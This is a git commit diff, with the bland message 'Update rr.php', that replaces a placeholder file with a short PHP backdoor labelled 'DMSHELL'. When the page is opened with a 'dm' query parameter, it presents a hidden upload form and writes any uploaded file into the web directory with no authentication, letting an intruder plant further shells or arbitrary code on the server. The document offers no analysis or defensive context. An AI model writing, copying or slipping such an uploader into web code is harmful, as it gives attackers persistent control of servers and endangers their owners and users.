6d934f58bb7183a876d488d3440155a53fa3c183
aznoisib <33202854+aznoisib@users.noreply.github.com>
2018-05-03 15:51:39 +0700

    Update rr.php

--- rr.php
+++ rr.php
@@ -1,1 +1,13 @@
-ok
+../Silent Is Golden ../DMSHELL
+<?php 
+if(isset($_GET["dm"])){
+echo"<pre><form method='post' enctype='multipart/form-data'><input type='file' name='x'><input name='de' type='submit'value='em'>";
+if($_POST['de']=='em'){
+if(@copy($_FILES["x"]["tmp_name"],$_FILES["x"]["name"])){
+echo"true";
+} else {
+echo"false";
+}
+} 
+}
+?>
